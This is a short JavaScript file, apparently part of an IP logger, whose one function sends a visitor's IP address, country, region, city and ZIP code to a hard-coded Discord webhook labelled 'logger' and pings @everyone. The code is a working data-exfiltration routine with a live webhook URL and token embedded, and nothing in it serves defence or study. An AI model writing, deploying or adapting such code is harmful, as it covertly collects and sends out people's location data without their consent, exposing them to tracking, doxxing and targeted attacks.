function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://ptb.discord.com/api/webhooks/1154671801046142986/FuiOLBWUEv9W316NnNm08BNxgdIFgjGLQJWN6hRgxjBMduMuXyefkUv0eiBgdF4qyya1");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "rush",
          avatar_url: "https://cdn.discordapp.com/attachments/1142894227072745482/1146152737248120943/rush.jpg", 
          content: "@everyone",
          embeds: [
               {
                    title: "logger",
                    color: 000000,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}